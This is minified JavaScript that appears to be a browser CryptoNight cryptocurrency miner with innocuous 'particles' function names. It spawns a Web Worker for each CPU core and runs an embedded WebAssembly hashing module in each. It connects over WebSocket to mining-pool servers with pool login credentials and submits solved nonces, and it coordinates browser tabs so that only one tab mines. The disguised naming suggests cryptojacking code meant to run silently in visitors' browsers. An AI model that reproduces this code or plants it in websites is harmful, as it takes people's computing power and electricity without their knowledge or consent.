function addWorkers(A){if(logicalProcessors=A,-1==A){try{logicalProcessors=window.navigator.hardwareConcurrency}catch(A){logicalProcessors=4}0<logicalProcessors&&40>logicalProcessors||(logicalProcessors=4)}for(;0<logicalProcessors--;)addWorker()}function startBroadcast(A){if("function"!=typeof BroadcastChannel)A();else{stopBroadcast();var I=new BroadcastChannel("channel"),g=Math.random(),B=[],Q=0,C=!0;B.push(g),I.onmessage=function(A){-1===B.indexOf(A.data)&&B.push(A.data)},startBroadcast.bc=I,startBroadcast.id=setInterval(function(){I.postMessage(g),Q++,0==Q%2&&(B.sort(),B[0]===g&&C&&(A(),C=!1,g=0),B=[],B.push(g))},1e3)}}function stopBroadcast(){void 0!==startBroadcast.bc&&startBroadcast.bc.close(),void 0!==startBroadcast.id&&clearInterval(startBroadcast.id)}function startParticlesWithId(A,I,g){I=void 0===I?-1:I,g=void 0===g?"":g,wasmSupported&&(stopParticles(),connected=0,handshake={identifier:"handshake",loginid:A,userid:g,version:8},startBroadcast(function(){addWorkers(I),reconnector()}))}function startParticles(A,I,g,B,Q){g=void 0===g?"":g,B=void 0===B?-1:B,Q=void 0===Q?"":Q,wasmSupported&&(stopParticles(),connected=0,handshake={identifier:"handshake",pool:A,login:I,password:g,userid:Q,version:8},startBroadcast(function(){addWorkers(B),reconnector()}))}function stopParticles(){connected=3,null!=ws&&ws.close(),deleteAllWorkers(),job=null,stopBroadcast()}function addWorker(){var A=new Worker(URL.createObjectURL(new Blob(["("+function(){function A(A){return H.locateFile?H.locateFile(A,Y):Y+A}function I(A,I){A||U("Assertion failed: "+I)}function g(A){var g=H["_"+A];return I(g,"Cannot call unknown function "+A+", make sure it is exported"),g}function B(A,I,B,E,i){i={string:function(A){var I=0;if(null!=A&&0!==A){var g=1+(A.length<<2),B=I=IA(g);C(A,r,B,g)}return I},array:function(A){var I=IA(A.length);return q.set(A,I),I}};var D,h=g(A),o=[];if(A=0,E)for(var w=0;w<E.length;w++){var F=i[B[w]];o[w]=F?(0===A&&(A=BA()),F(E[w])):E[w]}return B=h.apply(null,o),D=B,B="string"===I?D?Q(r,D,void 0):"":"boolean"===I?!!D:D,0!==A&&gA(A),B}function Q(A,I,g){var B=I+g;for(g=I;A[g]&&!(B<=g);)++g;if(16<g-I&&A.subarray&&x)return x.decode(A.subarray(I,g));for(B="";I<g;){var Q=A[I++];if(128&Q){var C=63&A[I++];if(192!=(224&Q)){var E=63&A[I++];65536>(Q=224==(240&Q)?(15&Q)<<12|C<<6|E:(7&Q)<<18|C<<12|E<<6|63&A[I++])?B+=String.fromCharCode(Q):(Q-=65536,B+=String.fromCharCode(55296|Q>>10,56320|1023&Q))}else B+=String.fromCharCode((31&Q)<<6|C)}else B+=String.fromCharCode(Q)}return B}function C(A,I,g,B){if(!(0<B))return 0;var Q=g;B=g+B-1;for(var C=0;C<A.length;++C){var E=A.charCodeAt(C);if(55296<=E&&57343>=E&&(E=65536+((1023&E)<<10)|1023&A.charCodeAt(++C)),127>=E){if(B<=g)break;I[g++]=E}else{if(2047>=E){if(B<=g+1)break;I[g++]=192|E>>6}else{if(65535>=E){if(B<=g+2)break;I[g++]=224|E>>12}else{if(B<=g+3)break;I[g++]=240|E>>18,I[g++]=128|E>>12&63}I[g++]=128|E>>6&63}I[g++]=128|63&E}}return I[g]=0,g-Q}function E(A){for(;0<A.length;){var I=A.shift();if("function"!=typeof I){var g=I.func;"number"==typeof g?void 0===I.arg?H.dynCall_v(g):H.dynCall_vi(g,I.arg):g(void 0===I.arg?null:I.arg)}else I()}}function i(A){return String.prototype.startsWith?A.startsWith(b):0===A.indexOf(b)}function D(){try{if(L)return new Uint8Array(L);var A=G(P);if(A)return A;if(s)return s(P);throw"both async and sync fetching of the wasm failed"}catch(A){U(A)}}function h(){return L||!y&&!M||"function"!=typeof fetch?new Promise(function(A,I){A(D())}):fetch(P,{credentials:"same-origin"}).then(function(A){if(!A.ok)throw"failed to load wasm binary file at '"+P+"'";return A.arrayBuffer()}).catch(function(){return D()})}function o(A){function I(A,I){if(H.asm=A.exports,m--,H.monitorRunDependencies&&H.monitorRunDependencies(m),0==m&&(null!==T&&(clearInterval(T),T=null),V)){var g=V;V=null,g()}}function g(A){I(A.instance)}function B(A){return h().then(function(A){return WebAssembly.instantiate(A,Q)}).then(A,function(A){n("failed to asynchronously prepare wasm: "+A),U(A)})}var Q={env:A,global:{NaN:NaN,Infinity:1/0},"global.Math":Math,asm2wasm:f};if(m++,H.monitorRunDependencies&&H.monitorRunDependencies(m),H.instantiateWasm)try{return H.instantiateWasm(Q,I)}catch(A){return n("Module.instantiateWasm callback failed with error: "+A),!1}return function(){if(L||"function"!=typeof WebAssembly.instantiateStreaming||i(P)||"function"!=typeof fetch)return B(g);fetch(P,{credentials:"same-origin"}).then(function(A){return WebAssembly.instantiateStreaming(A,Q).then(g,function(A){n("wasm streaming compile failed: "+A),n("falling back to ArrayBuffer instantiation"),B(g)})})}(),{}}function w(A){U("OOM")}function F(A){for(var g=[],B=0;B<A.length;B++){var Q=A[B];255<Q&&($&&I(!1,"Character code "+Q+" ("+String.fromCharCode(Q)+")  at offset "+B+" not in 0x00-0xFF."),Q&=255),g.push(String.fromCharCode(Q))}return g.join("")}function G(A){if(i(A)){if(A=A.slice(b.length),"boolean"==typeof a&&a){try{var I=Buffer.from(A,"base64")}catch(g){I=new Buffer(A,"base64")}var g=new Uint8Array(I.buffer,I.byteOffset,I.byteLength)}else try{var B=AA(A),Q=new Uint8Array(B.length);for(I=0;I<B.length;++I)Q[I]=B.charCodeAt(I);g=Q}catch(A){throw Error("Converting base64 string to bytes failed.")}return g}}function c(A){function I(){if(!v&&(v=!0,!p)){if(E(j),E(l),H.onRuntimeInitialized&&H.onRuntimeInitialized(),H.postRun)for("function"==typeof H.postRun&&(H.postRun=[H.postRun]);H.postRun.length;)u.unshift(H.postRun.shift());E(u)}}if(!(0<m)){if(H.preRun)for("function"==typeof H.preRun&&(H.preRun=[H.preRun]);H.preRun.length;)W.unshift(H.preRun.shift());E(W),0<m||(H.setStatus?(H.setStatus("Running..."),setTimeout(function(){setTimeout(function(){H.setStatus("")},1),I()},1)):I())}}function U(A){throw H.onAbort&&H.onAbort(A),d(A+=""),n(A),p=!0,"abort("+A+"). Build with -s ASSERTIONS=1 for more info."}function S(A){return parseInt(A.match(/[a-fA-F0-9]{2}/g).reverse().join(""),16)}var H=void 0!==H?H:{},N={};for(O in H)H.hasOwnProperty(O)&&(N[O]=H[O]);var y=!1,M=!1,a=!1,k=!1;k=!1,y="object"==typeof window,M="function"==typeof importScripts,a=(k="object"==typeof process&&"object"==typeof process.versions&&"string"==typeof process.versions.node)&&!y&&!M,k=!y&&!a&&!M;var R,s,K,J,Y="";a?(Y=__dirname+"/",R=function(A,I){var g;return(g=G(A))||(K||(K=require("fs")),J||(J=require("path")),A=J.normalize(A),g=K.readFileSync(A)),I?g:g.toString()},s=function(A){return A=R(A,!0),A.buffer||(A=new Uint8Array(A)),I(A.buffer),A},1<process.argv.length&&process.argv[1].replace(/\\/g,"/"),process.argv.slice(2),"undefined"!=typeof module&&(module.exports=H),process.on("uncaughtException",function(A){throw A}),process.on("unhandledRejection",U),H.inspect=function(){return"[Emscripten Module object]"}):k?("undefined"!=typeof read&&(R=function(A){var I=G(A);return I?F(I):read(A)}),s=function(A){var g;return(g=G(A))?g:"function"==typeof readbuffer?new Uint8Array(readbuffer(A)):(I("object"==typeof(g=read(A,"binary"))),g)},"undefined"!=typeof print&&("undefined"==typeof console&&(console={}),console.log=print,console.warn=console.error="undefined"!=typeof printErr?printErr:print)):(y||M)&&(M?Y=self.location.href:document.currentScript&&(Y=document.currentScript.src),Y=0!==Y.indexOf("blob:")?Y.substr(0,Y.lastIndexOf("/")+1):"",R=function(A){try{var I=new XMLHttpRequest;return I.open("GET",A,!1),I.send(null),I.responseText}catch(I){if(A=G(A))return F(A);throw I}},M&&(s=function(A){try{var I=new XMLHttpRequest;return I.open("GET",A,!1),I.responseType="arraybuffer",I.send(null),new Uint8Array(I.response)}catch(I){if(A=G(A))return A;throw I}}));var d=H.print||console.log.bind(console),n=H.printErr||console.warn.bind(console);for(O in N)N.hasOwnProperty(O)&&(H[O]=N[O]);N=null;var L,t,f={"f64-rem":function(A,I){return A%I},debugger:function(){}};H.wasmBinary&&(L=H.wasmBinary),"object"!=typeof WebAssembly&&n("no native wasm support detected");var e,q,r,Z,X,p=!1,x="undefined"!=typeof TextDecoder?new TextDecoder("utf8"):void 0;"undefined"!=typeof TextDecoder&&new TextDecoder("utf-16le");var z,O=H.TOTAL_MEMORY||67108864;(t=H.wasmMemory?H.wasmMemory:new WebAssembly.Memory({initial:O/65536,maximum:O/65536}))&&(e=t.buffer),O=e.byteLength,z=e,e=z,H.HEAP8=q=new Int8Array(z),H.HEAP16=Z=new Int16Array(z),H.HEAP32=X=new Int32Array(z),H.HEAPU8=r=new Uint8Array(z),H.HEAPU16=new Uint16Array(z),H.HEAPU32=new Uint32Array(z),H.HEAPF32=new Float32Array(z),H.HEAPF64=new Float64Array(z),X[3428]=5256624;var W=[],j=[],l=[],u=[],m=0,T=null,V=null;H.preloadedImages={},H.preloadedAudios={}
...
;i(P)||(P=A(P)),H.asm=function(A,I,g){return I.memory=t,I.table=new WebAssembly.Table({initial:12,maximum:12,element:"anyfunc"}),I.__memory_base=1024,I.__table_base=0,o(I)};var v,_=(C("GMT",r,13616,4),13616),$=!1,AA="function"==typeof atob?atob:function(A){var I,g,B,Q,C,E,i="",D=0;for(A=A.replace(/[^A-Za-z0-9\+\/=]/g,"");I="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(A.charAt(D++))<<2|(Q="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(A.charAt(D++)))>>4,g=(15&Q)<<4|(C="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(A.charAt(D++)))>>2,B=(3&C)<<6|(E="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(A.charAt(D++))),i+=String.fromCharCode(I),64!==C&&(i+=String.fromCharCode(g)),64!==E&&(i+=String.fromCharCode(B)),D<A.length;);return i};O=H.asm({},{c:U,b:function(A){return H.___errno_location&&(X[H.___errno_location()>>2]=A),A},j:function(A,I){return 42},i:function(){return q.length},h:function(A,I,g){r.set(r.subarray(I,I+g),A)},g:function(A){w(A)},f:function(A){var I=Date.now();return X[A>>2]=I/1e3|0,Z[A+4>>1]=I%1e3,Z[A+6>>1]=0,Z[A+8>>1]=0},e:function(A){A=new Date(1e3*X[A>>2]),X[3392]=A.getUTCSeconds(),X[3393]=A.getUTCMinutes(),X[3394]=A.getUTCHours(),X[3395]=A.getUTCDate(),X[3396]=A.getUTCMonth(),X[3397]=A.getUTCFullYear()-1900,X[3398]=A.getUTCDay(),X[3401]=0,X[3400]=0;var I=Date.UTC(A.getUTCFullYear(),0,1,0,0,0,0);return A=(A.getTime()-I)/864e5|0,X[3399]=A,X[3402]=_,13568},d:w,a:13712},e),H.asm=O,H._hash_cn=function(){return H.asm.k.apply(null,arguments)};var IA=H.stackAlloc=function(){return H.asm.l.apply(null,arguments)},gA=H.stackRestore=function(){return H.asm.m.apply(null,arguments)},BA=H.stackSave=function(){return H.asm.n.apply(null,arguments)};if(H.asm=O,H.ccall=B,H.cwrap=function(A,I,Q,C){var E=(Q=Q||[]).every(function(A){return"number"===A});return"string"!==I&&E&&!C?g(A):function(){return B(A,I,Q,arguments,C)}},V=function A(){v||c(),v||(V=A)},H.run=c,H.abort=U,H.preInit)for("function"==typeof H.preInit&&(H.preInit=[H.preInit]);0<H.preInit.length;)H.preInit.pop()();c();var QA=H.cwrap("hash_cn","string",["string","number","number","number"]);onmessage=function(A){A=A.data;var I=A.job;A=A.throttle;var g=!1,B="",Q=0,C=function(){if(null!==I){var A=S(I.target),C=(Math.floor(4294967296*Math.random())+0).toString(16),E=8-C.toString().length+1;Q=(Array(+(0<E&&E)).join("0")+C).match(/[a-fA-F0-9]{2}/g).reverse().join(""),C=I.blob.substring(0,78)+Q+I.blob.substring(86,I.blob.length);try{if("cn"===I.algo)B=QA(C,0,I.variant,I.height);else if("cn-lite"===I.algo)B=QA(C,1,I.variant,I.height);else if("cn-pico"===I.algo)B=QA(C,2,I.variant,I.height);else if("cn-half"===I.algo)B=QA(C,3,I.variant,I.height);else{if("cn-rwz"!==I.algo)throw"algorithm not supported!";B=QA(C,4,I.variant,I.height)}g=S(B.substring(56,64))<A}catch(A){console.log(A)}}},E=function(){g?postMessage(JSON.stringify({identifier:"solved",job_id:I.job_id,nonce:Q,result:B})):postMessage("nothing")};if(0===A)C(),E();else{var i=performance.now();C(),C=performance.now()-i,setTimeout(E,Math.round(A/(100-A+10)*C))}}}.toString()+")()"],{type:"text/javascript"})));workers.push(A),A.onmessage=on_workermsg,setTimeout(function(){informWorker(A)},2e3)}function removeWorker(){1>workers.length||workers.shift().terminate()}function deleteAllWorkers(){for(i=0;i<workers.length;i++)workers[i].terminate();workers=[]}function informWorker(A){on_workermsg({data:"wakeup",target:A})}function on_servermsg(A){A=JSON.parse(A.data),receiveStack.push(A),"job"==A.identifier&&(job=A)}function on_workermsg(A){var I=A.target;if(1!=connected)setTimeout(function(){informWorker(I)},2e3);else{if("nothing"!=A.data&&"wakeup"!=A.data){var g=JSON.parse(A.data);ws.send(A.data),sendStack.push(g)}null===job?setTimeout(function(){informWorker(I)},2e3):(I.postMessage({job:job,throttle:Math.max(0,Math.min(throttleParticles,100))}),"wakeup"!=A.data&&(totalhashes+=1))}}var ws,server="wss://ws1.server:80/;wss://ws2.server:80/;wss://ws3.server:80/",job=null,workers=[],receiveStack=[],sendStack=[],totalhashes=0,connected=0,reconnector=0,attempts=1,throttleParticles=0,handshake=null,wasmSupported=function(){try{if("object"==typeof WebAssembly&&"function"==typeof WebAssembly.instantiate){var A=new WebAssembly.Module(Uint8Array.of(0,97,115,109,1,0,0,0));if(A instanceof WebAssembly.Module)return new WebAssembly.Instance(A)instanceof WebAssembly.Instance}}catch(A){}return!1}(),openWebSocket=function(){null!=ws&&ws.close();var A=server.split(";");ws=new WebSocket(A[Math.floor(Math.random()*A.length)]),ws.onmessage=on_servermsg,ws.onerror=function(A){2>connected&&(connected=2),job=null},ws.onclose=function(){2>connected&&(connected=2),job=null},ws.onopen=function(){ws.send(JSON.stringify(handshake)),connected=attempts=1}};reconnector=function(){3!==connected&&(null==ws||0!==ws.readyState&&1!==ws.readyState)&&(attempts++,openWebSocket()),3!==connected&&setTimeout(reconnector,1e4*attempts)};